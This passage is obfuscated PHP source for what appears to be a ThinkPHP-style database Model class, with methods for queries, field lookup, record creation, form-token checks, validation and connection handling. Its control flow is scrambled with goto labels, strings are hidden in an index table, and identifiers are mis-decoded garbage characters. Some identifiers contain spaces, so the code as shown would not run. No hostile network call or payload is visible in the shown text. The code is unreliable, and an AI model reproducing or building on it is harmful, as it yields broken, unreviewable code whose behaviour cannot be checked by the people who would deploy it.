$this->db->select($f×«òšĞ‰); if (!1 === $dØ±ĞÇ‘à) { return !1; } goto AŠœö©öÍ´; AŠœö©öÍ´: if (empty($dØ±ĞÇ‘à)) { return null; } $this->data = $dØ±ĞÇ‘à[0]; $this->_afterFind($this->data, $f×«òšĞ‰); goto dÏ´çéæ¢Ô; eˆê¬êêØÌ: } protected function _afterFind(&$bÛ‘¦Ù , $DÈÉÁ×ÑÂÇ) { } protected function returnResult($B¸–®ê‚ºæ, $DŠ–ñ²Š…¤ = '') { $bãçµŸ…ùí =& $_SERVER[œÕÊİğö]; if ($DŠ–ñ²Š…¤) { if (is_callable($DŠ–ñ²Š…¤)) { return call_user_func($DŠ–ñ²Š…¤, $B¸–®ê‚ºæ); } switch (strtolower($DŠ–ñ²Š…¤)) { case $bãçµŸ…ùí[302]: return json_encode($B¸–®ê‚ºæ); case $bãçµŸ…ùí[303]: return xml_encode($B¸–®ê‚ºæ); } } return $B¸–®ê‚ºæ; } public function parseFieldsMap($b¤˜Ù‚ãæ, $FàĞºº¢ø = 1) { if (!empty($this->_map)) { foreach ($this->_map as $díŠœ™òÑø => $a´òÈ¸›ïÖ) { if ($FàĞºº¢ø == 1) { if (isset($b¤˜Ù‚ãæ[$a´òÈ¸›ïÖ])) { $b¤˜Ù‚ãæ[$díŠœ™òÑø] = $b¤˜Ù‚ãæ[$a´òÈ¸›ïÖ]; unset($b¤˜Ù‚ãæ[$a´òÈ¸›ïÖ]); } } else { if (isset($b¤˜Ù‚ãæ[$díŠœ™òÑø])) { $b¤˜Ù‚ãæ[$a´òÈ¸›ïÖ] = $b¤˜Ù‚ãæ[$díŠœ™òÑø]; unset($b¤˜Ù‚ãæ[$díŠœ™òÑø]); } } } } return $b¤˜Ù‚ãæ; } public function setField($dŞ“‹‚óÂ¥, $D¿áÂÔÁÈÙ = '') { if (is_array($dŞ“‹‚óÂ¥)) { $bº¸Ùî“”Æ = $dŞ“‹‚óÂ¥; } else { $bº¸Ùî“”Æ[$dŞ“‹‚óÂ¥] = $D¿áÂÔÁÈÙ; } return $this->save($bº¸Ùî“”Æ); } public function setAdd($eÁËƒ˜Œƒ÷, $e½Ğå Ğó¯ = 1) { $f›óÌù­ˆà =& $_SERVER[œÕÊİğö]; $Bô›…Ï•´™ = $eÁËƒ˜Œƒ÷ . $f›óÌù­ˆà[304] . $e½Ğå Ğó¯; if ($e½Ğå Ğó¯ < 0) { $Bô›…Ï•´™ = $eÁËƒ˜Œƒ÷ . $e½Ğå Ğó¯; } return $this->setField($eÁËƒ˜Œƒ÷, array($f›óÌù­ˆà[305], $Bô›…Ï•´™)); } public function getField($B¨¢¤¦·±Î, $aÌÛ©Ñ­Ì¤ = null) { $Dé©š”ÍƒÌ =& $_SERVER[œÕÊİğö]; $aÇÁƒˆµßÆ[$Dé©š”ÍƒÌ[281]] = $B¨¢¤¦·±Î; $aÇÁƒˆµßÆ = $this->_parseOptions($aÇÁƒˆµßÆ); $B¨¢¤¦·±Î = trim($B¨¢¤¦·±Î); if (strpos($B¨¢¤¦·±Î, $Dé©š”ÍƒÌ[57])) { if (!isset($aÇÁƒˆµßÆ[$Dé©š”ÍƒÌ[300]])) { $aÇÁƒˆµßÆ[$Dé©š”ÍƒÌ[300]] = is_numeric($aÌÛ©Ñ­Ì¤) ? $aÌÛ©Ñ­Ì¤ : $Dé©š”ÍƒÌ[43]; } $a“ìÊ¢èÍÄ = $this->db->select($aÇÁƒˆµßÆ); if (!empty($a“ìÊ¢èÍÄ)) { goto e±š–·…š ; e±š–·…š : $Då½‰¬ê‰ = explode($Dé©š”ÍƒÌ[57], $B¨¢¤¦·±Î); $B¨¢¤¦·±Î = array_keys($a“ìÊ¢èÍÄ[0]); $AÒ„©Ÿ¢¬ = array_shift($B¨¢¤¦·±Î); goto EíÚ‡çÏ†; AŸñÛÆÎ›‚: foreach ($a“ìÊ¢èÍÄ as $f×­­ÇèÚá) { $eªãòĞƒ’ = $f×­­ÇèÚá[$AÒ„©Ÿ¢¬]; if (2 == $EÙ¤Àã§°›) { $b»¶òÙ–½£[$eªãòĞƒ’] = $f×­­ÇèÚá[$Dõ¨‘ éùï]; } else { $b»¶òÙ–½£[$eªãòĞƒ’] = is_string($aÌÛ©Ñ­Ì¤) ? implode($aÌÛ©Ñ­Ì¤, $f×­­ÇèÚá) : $f×­­ÇèÚá; } } return $b»¶òÙ–½£; goto bÜ £¥Ç›Ä; EíÚ‡çÏ†: $Dõ¨‘ éùï = array_shift($B¨¢¤¦·±Î); $b»¶òÙ–½£ = array(); $EÙ¤Àã§°› = count($Då½‰¬ê‰); goto AŸñÛÆÎ›‚; bÜ £¥Ç›Ä: } } else { if (!0 !== $aÌÛ©Ñ­Ì¤) { $aÇÁƒˆµßÆ[$Dé©š”ÍƒÌ[300]] = is_numeric($aÌÛ©Ñ­Ì¤) ? $aÌÛ©Ñ­Ì¤ : 1; } if ($aÌÛ©Ñ­Ì¤ === $Dé©š”ÍƒÌ[263]) { unset($aÇÁƒˆµßÆ[$Dé©š”ÍƒÌ[300]]); } $f×­­ÇèÚá = $this->db->select($aÇÁƒˆµßÆ); if (!empty($f×­­ÇèÚá)) { if ($aÌÛ©Ñ­Ì¤ === $Dé©š”ÍƒÌ[263]) { return reset($f×­­ÇèÚá[0]); } if (!0 !== $aÌÛ©Ñ­Ì¤ && 1 == $aÇÁƒˆµßÆ[$Dé©š”ÍƒÌ[300]]) { return reset($f×­­ÇèÚá[0]); } foreach ($f×­­ÇèÚá as $Bç×òö˜à¼) { $aŸ¼±ò¦¤[] = $Bç×òö˜à¼[$B¨¢¤¦·±Î]; } return $aŸ¼±ò¦¤; } } return null; } public function create($B’İ‹ïˆÚ = '', $A˜²ÂöÔøÓ = '') { goto Dë£Ø†³£Ä; Cª¾ˆ‘åÑá: if (isset($B…šöŠ’ÏÃ)) { if (is_string($B…šöŠ’ÏÃ)) { $B…šöŠ’ÏÃ = explode($dƒ›îÏš†Ã[57], $B…šöŠ’ÏÃ); } if (think_config($dƒ›îÏš†Ã[306])) { $B…šöŠ’ÏÃ[] = think_config($dƒ›îÏš†Ã[307]); } foreach ($B’İ‹ïˆÚ as $bˆå—Ô‰… => $fĞŸ‹åëÚ¦) { if (!in_array($bˆå—Ô‰…, $B…šöŠ’ÏÃ)) { unset($B’İ‹ïˆÚ[$bˆå—Ô‰…]); } } } if (!$this->autoValidation($B’İ‹ïˆÚ, $A˜²ÂöÔøÓ)) { return !1; } if (!$this->autoCheckToken($B’İ‹ïˆÚ)) { $this->error = think_lang($dƒ›îÏš†Ã[308]); return !1; } goto b¸êùÜŸÙ·; C…ŠÏ®Ç: $B’İ‹ïˆÚ = $this->parseFieldsMap($B’İ‹ïˆÚ, 0); $A˜²ÂöÔøÓ = $A˜²ÂöÔøÓ ? $A˜²ÂöÔøÓ : (!empty($B’İ‹ïˆÚ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$dƒ›îÏš†Ã[281]])) { $B…šöŠ’ÏÃ = $this->options[$dƒ›îÏš†Ã[281]]; unset($this->options[$dƒ›îÏš†Ã[281]]); } elseif ($A˜²ÂöÔøÓ == THINK_MODEL_INSERT && isset($this->insertFields)) { $B…šöŠ’ÏÃ = $this->insertFields; } elseif ($A˜²ÂöÔøÓ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $B…šöŠ’ÏÃ = $this->updateFields; } goto Cª¾ˆ‘åÑá; Dë£Ø†³£Ä: $dƒ›îÏš†Ã =& $_SERVER[œÕÊİğö]; if (empty($B’İ‹ïˆÚ)) { $B’İ‹ïˆÚ = $_POST; } elseif (is_object($B’İ‹ïˆÚ)) { $B’İ‹ïˆÚ = get_object_vars($B’İ‹ïˆÚ); } if (empty($B’İ‹ïˆÚ) || !is_array($B’İ‹ïˆÚ)) { $this->error = think_lang($dƒ›îÏš†Ã[279]); return !1; } goto C…ŠÏ®Ç; a‰‘¤ÕáŞ: return $B’İ‹ïˆÚ; goto bùé»îƒÄ; b¸êùÜŸÙ·: if ($this->autoCheckFields) { $B…šöŠ’ÏÃ = $this->getDbFields(); foreach ($B’İ‹ïˆÚ as $bˆå—Ô‰… => $fĞŸ‹åëÚ¦) { if (!in_array($bˆå—Ô‰…, $B…šöŠ’ÏÃ)) { unset($B’İ‹ïˆÚ[$bˆå—Ô‰…]); } elseif (MAGIC_QUOTES_GPC && is_string($fĞŸ‹åëÚ¦)) { $B’İ‹ïˆÚ[$bˆå—Ô‰…] = stripslashes($fĞŸ‹åëÚ¦); } } } $this->autoOperation($B’İ‹ïˆÚ, $A˜²ÂöÔøÓ); $this->data = $B’İ‹ïˆÚ; goto a‰‘¤ÕáŞ; bùé»îƒÄ: } public function autoCheckToken($EóàÇÔ£) { $Dâ˜¶¹‚Éƒ =& $_SERVER[œÕÊİğö]; if (isset($this->options[$Dâ˜¶¹‚Éƒ[309]]) && !$this->options[$Dâ˜¶¹‚Éƒ[309]]) { return !0; } if (think_config($Dâ˜¶¹‚Éƒ[306])) { $b·Š»”¾ = think_config($Dâ˜¶¹‚Éƒ[307]); if (!isset($EóàÇÔ£[$b·Š»”¾]) || Session::get($b·Š»”¾)) { return !1; } list($a‘éÃ¤„, $F™ôŠ¬§) = explode($Dâ˜¶¹‚Éƒ[81], $EóàÇÔ£[$b·Š»”¾]); if ($F™ôŠ¬§ && Session::get($b·Š»”¾ . $Dâ˜¶¹‚Éƒ[105] . $a‘éÃ¤„) === $F™ôŠ¬§) { Session::remove($b·Š»”¾ . $Dâ˜¶¹‚Éƒ[105] . $a‘éÃ¤„); return !0; } if (think_config($Dâ˜¶¹‚Éƒ[310])) { Session::remove($b·Š»”¾ . $Dâ˜¶¹‚Éƒ[105] . $a‘éÃ¤„); } return !1; } return !0; } public function regex($B¼¤ºÜ‚âš, $BçÄø½¢á±) { $C²¦Èê«È‹ =& $_SERVER[œÕÊİğö]; $dÑ·Å…ï = array($C²¦Èê«È‹[311] => $C²¦Èê«È‹[312], $C²¦Èê«È‹[313] => $C²¦Èê«È‹[314], $C²¦Èê«È‹[315] => $C²¦Èê«È‹[316], $C²¦Èê«È‹[317] => $C²¦Èê«È‹[318], $C²¦Èê«È‹[319] => $C²¦Èê«È‹[320], $C²¦Èê«È‹[321] => $C²¦Èê«È‹[322], $C²¦Èê«È‹[323] => $C²¦Èê«È‹[324], $C²¦Èê«È‹[298] => $C²¦Èê«È‹[325], $C²¦Èê«È‹[326] => $C²¦Èê«È‹[327]); if (isset($dÑ·Å…ï[strtolower($BçÄø½¢á±)])) { $BçÄø½¢á± = $dÑ·Å…ï[strtolower($BçÄø½¢á±)]; } return preg_match($BçÄø½¢á±, $B¼¤ºÜ‚âš) === 1; } private function autoOperation(&$CÛÛâÒ® °, $AæÇõÅ) { $bËÌ³„º¤ô =& $_SERVER[œÕÊİğö]; if (!empty($this->options[$bËÌ³„º¤ô[328]])) { $dÊèŠáàù = $this->options[$bËÌ³„º¤ô[328]]; unset($this->options[$bËÌ³„º¤ô[328]]); } elseif (!empty($this->_auto)) { $dÊèŠáàù = $this->_auto; } if (isset($dÊèŠáàù)) { foreach ($dÊèŠáàù as $B÷º¨°Å¸Á) { if (empty($B÷º¨°Å¸Á[2])) { $B÷º¨°Å¸Á[2] = THINK_MODEL_INSERT; } if ($AæÇõÅ == $B÷º¨°Å¸Á[2] || $B÷º¨°Å¸Á[2] == THINK_MODEL_BOTH) { switch (trim($B÷º¨°Å¸Á[3])) { case $bËÌ³„º¤ô[329]: case $bËÌ³„º¤ô[330]: $C™Î‘ƒĞ‡ = isset($B÷º¨°Å¸Á[4]) ? (array) $B÷º¨°Å¸Á[4] : array(); if (isset($CÛÛâÒ® °[$B÷º¨°Å¸Á[0]])) { array_unshift($C™Î‘ƒĞ‡, $CÛÛâÒ® °[$B÷º¨°Å¸Á[0]]); } if ($bËÌ³„º¤ô[329] == $B÷º¨°Å¸Á[3]) { $CÛÛâÒ® °[$B÷º¨°Å¸Á[0]] = call_user_func_array($B÷º¨°Å¸Á[1], $C™Î‘ƒĞ‡); } else { $CÛÛâÒ® °[$B÷º¨°Å¸Á[0]] = call_user_func_array(array(&$this, $B÷º¨°Å¸Á[1]), $C™Î‘ƒĞ‡); } break; case $bËÌ³„º¤ô[281]: $CÛÛâÒ® °[$B÷º¨°Å¸Á[0]] = $CÛÛâÒ® °[$B÷º¨°Å¸Á[1]]; break; case $bËÌ³„º¤ô[331]: if ($bËÌ³„º¤ô[43] === $CÛÛâÒ® °[$B÷º¨°Å¸Á[0]]) { unset($CÛÛâÒ® °[$B÷º¨°Å¸Á[0]]); } break; case $bËÌ³„º¤ô[332]: default: $CÛÛâÒ® °[$B÷º¨°Å¸Á[0]] = $B÷º¨°Å¸Á[1]; } if (!1 === $CÛÛâÒ® °[$B÷º¨°Å¸Á[0]]) { unset($CÛÛâÒ® °[$B÷º¨°Å¸Á[0]]); } } } } return $CÛÛâÒ® °; } protected function autoValidation($E’«×Í§Øõ, $cØİÌÔŒ‘Ü) { $cİö£ğ¡Ğİ =& $_SERVER[œÕÊİğö]; if (!empty($this->options[$cİö£ğ¡Ğİ[333]])) { $AÃ‰œ©±ùç = $this->options[$cİö£ğ¡Ğİ[333]]; unset($this->options[$cİö£ğ¡Ğİ[333]]); } elseif (!empty($this->_validate)) { $AÃ‰œ©±ùç = $this->_validate; } if (isset($AÃ‰œ©±ùç)) { if ($this->patchValidate) { $this->error = array(); } foreach ($AÃ‰œ©±ùç as $CªÈÈ”âçë => $a…Ôğ“í¼) { if (empty($a…Ôğ“í¼[5]) || $a…Ôğ“í¼[5] == THINK_MODEL_BOTH || $a…Ôğ“í¼[5] == $cØİÌÔŒ‘Ü) { if (0 == strpos($a…Ôğ“í¼[2], $cİö£ğ¡Ğİ[334]) && strpos($a…Ôğ“í¼[2], $cİö£ğ¡Ğİ[335])) { $a…Ôğ“í¼[2] = think_lang(substr($a…Ôğ“í¼[2], 2, -1)); } $a…Ôğ“í¼[3] = isset($a…Ôğ“í¼[3]) ? $a…Ôğ“í¼[3] : THINK_EXISTS_VALIDATE; $a…Ôğ“í¼[4] = isset($a…Ôğ“í¼[4]) ? $a…Ôğ“í¼[4] : $cİö£ğ¡Ğİ[336]; switch ($a…Ôğ“í¼[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($E’«×Í§Øõ, $a…Ôğ“í¼)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($cİö£ğ¡Ğİ[43] != trim($E’«×Í§Øõ[$a…Ôğ“í¼[0]])) { if (!1 === $this->_validationField($E’«×Í§Øõ, $a…Ôğ“í¼)) { return !1; } } break; default: if (isset($E’«×Í§Øõ[$a…Ôğ“í¼[0]])) { if (!1 === $this->_validationField($E’«×Í§Øõ, $a…Ôğ“í¼)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($AÊÁä¬ºæµ, $Eâç‹çƒ) { if (!1 === $this->_validationFieldItem($AÊÁä¬ºæµ, $Eâç‹çƒ)) { if ($this->patchValidate) { $this->error[$Eâç‹çƒ[0]] = $Eâç‹çƒ[2]; } else { $this->error = $Eâç‹çƒ[2]; return !1; } } return; } protected function _validationFieldItem($EªÆùã°Á, $CƒöÚ®ÙĞ) { $bÏ­í¾†ÎÔ =& $_SERVER[œÕÊİğö]; switch (strtolower(trim($CƒöÚ®ÙĞ[4]))) { case $bÏ­í¾†ÎÔ[329]: case $bÏ­í¾†ÎÔ[330]: $C…ò«¢í¤‹ = isset($CƒöÚ®ÙĞ[6]) ? (array) $CƒöÚ®ÙĞ[6] : array(); if (is_string($CƒöÚ®ÙĞ[0]) && strpos($CƒöÚ®ÙĞ[0], $bÏ­í¾†ÎÔ[57])) { $CƒöÚ®ÙĞ[0] = explode($bÏ­í¾†ÎÔ[57], $CƒöÚ®ÙĞ[0]); } if (is_array($CƒöÚ®ÙĞ[0])) { foreach ($CƒöÚ®ÙĞ[0] as $Aëùè®ˆ©) { $Có¤‘¢¥[$Aëùè®ˆ©] = $EªÆùã°Á[$Aëùè®ˆ©]; } array_unshift($C…ò«¢í¤‹, $Có¤‘¢¥); } else { array_unshift($C…ò«¢í¤‹, $EªÆùã°Á[$CƒöÚ®ÙĞ[0]]); } if ($bÏ­í¾†ÎÔ[329] == $CƒöÚ®ÙĞ[4]) { return call_user_func_array($CƒöÚ®ÙĞ[1], $C…ò«¢í¤‹); } else { return call_user_func_array(array(&$this, $CƒöÚ®ÙĞ[1]), $C…ò«¢í¤‹); } case $bÏ­í¾†ÎÔ[337]: return $EªÆùã°Á[$CƒöÚ®ÙĞ[0]] == $EªÆùã°Á[$CƒöÚ®ÙĞ[1]]; case $bÏ­í¾†ÎÔ[338]: if (is_string($CƒöÚ®ÙĞ[0]) && strpos($CƒöÚ®ÙĞ[0], $bÏ­í¾†ÎÔ[57])) { $CƒöÚ®ÙĞ[0] = explode($bÏ­í¾†ÎÔ[57], $CƒöÚ®ÙĞ[0]); } $CÇÔÙ¿¼®Í = array(); if (is_array($CƒöÚ®ÙĞ[0])) { foreach ($CƒöÚ®ÙĞ[0] as $Aëùè®ˆ©) { $CÇÔÙ¿¼®Í[$Aëùè®ˆ©] = $EªÆùã°Á[$Aëùè®ˆ©]; } } else { $CÇÔÙ¿¼®Í[$CƒöÚ®ÙĞ[0]] = $EªÆùã°Á[$CƒöÚ®ÙĞ[0]]; } if (!empty($EªÆùã°Á[$this->getPk()])) { $CÇÔÙ¿¼®Í[$this->getPk()] = array($bÏ­í¾†ÎÔ[339], $EªÆùã°Á[$this->getPk()]); } if ($this->where($CÇÔÙ¿¼®Í)->find()) { return !1; } return !0; default: return $this->check($EªÆùã°Á[$CƒöÚ®ÙĞ[0]], $CƒöÚ®ÙĞ[1], $CƒöÚ®ÙĞ[4]); } } public function check($DÀŠÈ£¬„Ó, $Fº²àÛÇá, $A³ì“¦…‡• = "\x72\x65\x67\145\x78") { $a¹Ìõ‹±Œ =& $_SERVER[œÕÊİğö]; $A³ì“¦…‡• = strtolower(trim($A³ì“¦…‡•)); switch ($A³ì“¦…‡•) { case $a¹Ìõ‹±Œ[7]: case $a¹Ìõ‹±Œ[340]: $bä·ªØâó” = is_array($Fº²àÛÇá) ? $Fº²àÛÇá : explode($a¹Ìõ‹±Œ[57], $Fº²àÛÇá); return $A³ì“¦…‡• == $a¹Ìõ‹±Œ[7] ? in_array($DÀŠÈ£¬„Ó, $bä·ªØâó”) : !in_array($DÀŠÈ£¬„Ó, $bä·ªØâó”); case $a¹Ìõ‹±Œ[341]: case $a¹Ìõ‹±Œ[342]: if (is_array($Fº²àÛÇá)) { $fÌ…ô´ëÆÍ = $Fº²àÛÇá[0]; $fğ¹Ÿ¶¾çŒ = $Fº²àÛÇá[1]; } else { list($fÌ…ô´ëÆÍ, $fğ¹Ÿ¶¾çŒ) = explode($a¹Ìõ‹±Œ[57], $Fº²àÛÇá); } return $A³ì“¦…‡• == $a¹Ìõ‹±Œ[341] ? $DÀŠÈ£¬„Ó >= $fÌ…ô´ëÆÍ && $DÀŠÈ£¬„Ó <= $fğ¹Ÿ¶¾çŒ : $DÀŠÈ£¬„Ó < $fÌ…ô´ëÆÍ || $DÀŠÈ£¬„Ó > $fğ¹Ÿ¶¾çŒ; case $a¹Ìõ‹±Œ[343]: case $a¹Ìõ‹±Œ[344]: return $A³ì“¦…‡• == $a¹Ìõ‹±Œ[343] ? $DÀŠÈ£¬„Ó == $Fº²àÛÇá : $DÀŠÈ£¬„Ó != $Fº²àÛÇá; case $a¹Ìõ‹±Œ[345]: $FƒÖˆ­åê = mb_strlen($DÀŠÈ£¬„Ó, $a¹Ìõ‹±Œ[346]); if (strpos($Fº²àÛÇá, $a¹Ìõ‹±Œ[57])) { list($fÌ…ô´ëÆÍ, $fğ¹Ÿ¶¾çŒ) = explode($a¹Ìõ‹±Œ[57], $Fº²àÛÇá); return $FƒÖˆ­åê >= $fÌ…ô´ëÆÍ && $FƒÖˆ­åê <= $fğ¹Ÿ¶¾çŒ; } else { return $FƒÖˆ­åê == $Fº²àÛÇá; } case $a¹Ìõ‹±Œ[347]: list($C…‡ñµŞ½, $DÆèì¶­Œâ) = explode($a¹Ìõ‹±Œ[57], $Fº²àÛÇá); if (!is_numeric($C…‡ñµŞ½)) { $C…‡ñµŞ½ = strtotime($C…‡ñµŞ½); } if (!is_numeric($DÆèì¶­Œâ)) { $DÆèì¶­Œâ = strtotime($DÆèì¶­Œâ); } return NOW_TIME >= $C…‡ñµŞ½ && NOW_TIME <= $DÆèì¶­Œâ; case $a¹Ìõ‹±Œ[348]: return in_array(get_client_ip(), explode($a¹Ìõ‹±Œ[57], $Fº²àÛÇá)); case $a¹Ìõ‹±Œ[349]: return !in_array(get_client_ip(), explode($a¹Ìõ‹±Œ[57], $Fº²àÛÇá)); case $a¹Ìõ‹±Œ[336]: default: return $this->regex($DÀŠÈ£¬„Ó, $Fº²àÛÇá); } } public function query($CÅÜ”œ§Ë, $dÓ»ğİçË = false) { $fÀ¶¿ß ¬Æ =& $_SERVER[œÕÊİğö]; if (!is_bool($dÓ»ğİçË) && !is_array($dÓ»ğİçË)) { $dÓ»ğİçË = func_get_args(); array_shift($dÓ»ğİçË); } $CÅÜ”œ§Ë = str_replace(array($fÀ¶¿ß ¬Æ[15], $fÀ¶¿ß ¬Æ[350]), $fÀ¶¿ß ¬Æ[60], $CÅÜ”œ§Ë); $CÅÜ”œ§Ë = $this->parseSql($CÅÜ”œ§Ë, $dÓ»ğİçË); return $this->db->query($CÅÜ”œ§Ë); } public function execute($b–¸Šèè¥Ò, $B±ÀŞ§Šâ¨ = false) { if (!is_bool($B±ÀŞ§Šâ¨) && !is_array($B±ÀŞ§Šâ¨)) { $B±ÀŞ§Šâ¨ = func_get_args(); array_shift($B±ÀŞ§Šâ¨); } $b–¸Šèè¥Ò = $this->parseSql($b–¸Šèè¥Ò, $B±ÀŞ§Šâ¨); return $this->db->execute($b–¸Šèè¥Ò); } protected function parseSql($A¼Ê÷ÜŒ„, $f´‹ø’…¬) { $B…À›ÛèØŠ =& $_SERVER[œÕÊİğö]; if (!0 === $f´‹ø’…¬) { $bØàÈá = $this->_parseOptions(); $A¼Ê÷ÜŒ„ = $this->db->parseSql($A¼Ê÷ÜŒ„, $bØàÈá); } elseif (is_array($f´‹ø’…¬)) { $f´‹ø’…¬ = array_map(array($this->db, $B…À›ÛèØŠ[351]), $f´‹ø’…¬); $A¼Ê÷ÜŒ„ = vsprintf($A¼Ê÷ÜŒ„, $f´‹ø’…¬); } else { $A¼Ê÷ÜŒ„ = strtr($A¼Ê÷ÜŒ„, array($B…À›ÛèØŠ[352] => $this->getTableName(), $B…À›ÛèØŠ[353] => think_config($B…À›ÛèØŠ[252]))); } $this->db->setModel($this->name); return $A¼Ê÷ÜŒ„; } public function db($c›ªãª¼ï¬ = '', $aì—Íº¡àŠ = '', $b˜ÖºÏ¨Óš = array()) { goto Dï¦¶²àĞˆ; f´ßóÃƒ±Æ: static $Eòó…¯—ˆ• = array(); if (!isset($Eòó…¯—ˆ•[$c›ªãª¼ï¬]) || isset($Eòó…¯—ˆ•[$c›ªãª¼ï¬]) && $aì—Íº¡àŠ && $bˆ¥‘ë¸—µ[$c›ªãª¼ï¬] != $aì—Íº¡àŠ) { if (!empty($aì—Íº¡àŠ) && is_string($aì—Íº¡àŠ) && !1 === strpos($aì—Íº¡àŠ, $a‰Ø¹ê›Ğ[8])) { $aì—Íº¡àŠ = think_config($aì—Íº¡àŠ); } $Eòó…¯—ˆ•[$c›ªãª¼ï¬] = Db::getInstance($aì—Íº¡àŠ); } elseif (NULL === $aì—Íº¡àŠ) { $Eòó…¯—ˆ•[$c›ªãª¼ï¬]->close(); unset($Eòó…¯—ˆ•[$c›ªãª¼ï¬]); return; } if (!empty($b˜ÖºÏ¨Óš)) { if (is_string($b˜ÖºÏ¨Óš)) { parse_str($b˜ÖºÏ¨Óš, $b˜ÖºÏ¨Óš); } foreach ($b˜ÖºÏ¨Óš as $C…²ÒˆŠ¼Ğ => $Câ–¤„ÔˆÚ) { $this->setProperty($C…²ÒˆŠ¼Ğ, $Câ–¤„ÔˆÚ); } } goto Dæ–ÄØÛŸ®; c÷ƒæÑãáÍ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto C«Ùéù¨; Dæ–ÄØÛŸ®: $bˆ¥‘ë¸—µ[$c›ªãª¼ï¬] = $aì—Íº¡àŠ; $this->db = $Eòó…¯—ˆ•[$c›ªãª¼ï¬]; $this->_after_db(); goto c÷ƒæÑãáÍ; Dï¦¶²àĞˆ: $a‰Ø¹ê›Ğ =& $_SERVER[œÕÊİğö]; if ($a‰Ø¹ê›Ğ[43] === $c›ªãª¼ï¬ && $this->db) { return $this->db; } static $bˆ¥‘ë¸—µ = array(); goto f´ßóÃƒ±Æ; C«Ùéù¨: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $BË¤ò´—ÊØ = get_class($this); if ($BË¤ò´—ÊØ == $_SERVER[œÕÊİğö][354]) { return $this->name; } $this->name = substr($BË¤ò´—ÊØ, 0, -5); } return $this->name; } public function getTableName() { $e¬×ãŠÒ× =& $_SERVER[œÕÊİğö]; if (empty($this->trueTableName)) { $Cõ…‡º×ëš = !empty($this->tablePrefix) ? $this->tablePrefix : $e¬×ãŠÒ×[43]; if (!empty($this->tableName)) { $Cõ…‡º×ëš .= $this->tableName; } else { $Cõ…‡º×ëš .= think_parse_name($this->name); } $this->trueTableName = strtolower($Cõ…‡º×ëš); } return (!empty($this->dbName) ? $this->dbName . $e¬×ãŠÒ×[105] : $e¬×ãŠÒ×[43]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $F¼¡Û¹¨‹ì =& $_SERVER[œÕÊİğö]; return isset($this->fields[$F¼¡Û¹¨‹ì[259]]) ? $this->fields[$F¼¡Û¹¨‹ì[259]] : $this->pk; } public function getDbFields() { $E•­äŒ”Ó =& $_SERVER[œÕÊİğö]; if (isset($this->options[$E•­äŒ”Ó[287]])) { $F‰¥ğã½Ğ² = $this->db->getFields($this->options[$E•­äŒ”Ó[287]]); return $F‰¥ğã½Ğ² ? array_keys($F‰¥ğã½Ğ²) : !1; } if ($this->fields) { $F‰¥ğã½Ğ² = $this->fields; unset($F‰¥ğã½Ğ²[$E•­äŒ”Ó[258]], $F‰¥ğã½Ğ²[$E•­äŒ”Ó[259]], $F‰¥ğã½Ğ²[$E•­äŒ”Ó[260]], $F‰¥ğã½Ğ²[$E•­äŒ”Ó[257]]); return $F‰¥ğã½Ğ²; } return !1; } public function data($aí›¾áã” = '') { $C§Œ¤ùÖ¯Í =& $_SERVER[œÕÊİğö]; if ($C§Œ¤ùÖ¯Í[43] === $aí›¾áã” && !empty($this->data)) { return $this->data; } if (is_object($aí›¾áã”)) { $aí›¾áã” = get_object_vars($aí›¾áã”); } elseif (is_string($aí›¾áã”)) { parse_str($aí›¾áã”, $aí›¾áã”); } elseif (!is_array($aí›¾áã”)) { think_exception(think_lang($C§Œ¤ùÖ¯Í[279])); } $this->data = $aí›¾áã”; return $this; } public function join($aà¢‚Š‡¼ô) { $fè‚ñåóáÓ =& $_SERVER[œÕÊİğö]; if (is_array($aà¢‚Š‡¼ô)) { $this->options[$fè‚ñåóáÓ[290]] = $aà¢‚Š‡¼ô; } elseif (!empty($aà¢‚Š‡¼ô)) { $this->options[$fè‚ñåóáÓ[290]][] = $aà¢‚Š‡¼ô; } return $this; } public function union($cİ”šĞŞ›“, $BÔ–‰·¶óõ = false) { goto e¢µÎéÓ§Â; b³º’ààÖİ: if (is_object($cİ”šĞŞ›“)) { $cİ”šĞŞ›“ = get_object_vars($cİ”šĞŞ›“); } if (is_string($cİ”šĞŞ›“)) { $Bë­´ƒ° = $cİ”šĞŞ›“; } elseif (is_array($cİ”šĞŞ›“)) { if (isset($cİ”šĞŞ›“[0])) { $this->options[$eë½•Ç¹¯†[355]] = array_merge($this->options[$eë½•Ç¹¯†[355]], $cİ”šĞŞ›“); return $this; } else { $Bë­´ƒ° = $cİ”šĞŞ›“; } } else { think_exception(think_lang($eë½•Ç¹¯†[279])); } $this->options[$eë½•Ç¹¯†[355]][] = $Bë­´ƒ°; goto a‘ĞÙ»öŠ; e¢µÎéÓ§Â: $eë½•Ç¹¯† =& $_SERVER[œÕÊİğö]; if (empty($cİ”šĞŞ›“)) { return $this; } if ($BÔ–‰·¶óõ) { $this->options[$eë½•Ç¹¯†[355]][$eë½•Ç¹¯†[356]] = !0; } goto b³º’ààÖİ; a‘ĞÙ»öŠ: return $this; goto AÄ•“±åÆ; AÄ•“±åÆ: } public function cache($eêËÔß°ø = true, $b¦ÌñŒ‘÷Ğ = null, $Eö‘Æİà‡ = '') { $C®×ÛãâËã =& $_SERVER[œÕÊİğö]; if (!1 !== $eêËÔß°ø) { $this->options[$C®×ÛãâËã[357]] = array($C®×ÛãâËã[103] => $eêËÔß°ø, $C®×ÛãâËã[347] => $b¦ÌñŒ‘÷Ğ, $C®×ÛãâËã[39] => $Eö‘Æİà‡); } return $this; } public function field($B®›÷ˆøÒ, $b‹ñİçµ = false) { $CŒ®‰øÈòó =& $_SERVER[œÕÊİğö]; if (!0 === $B®›÷ˆøÒ) { $fç¸ÁÚ÷‰§ = $this->getDbFields(); $B®›÷ˆøÒ = $fç¸ÁÚ÷‰§ ? $fç¸ÁÚ÷‰§ : $CŒ®‰øÈòó[192]; } elseif 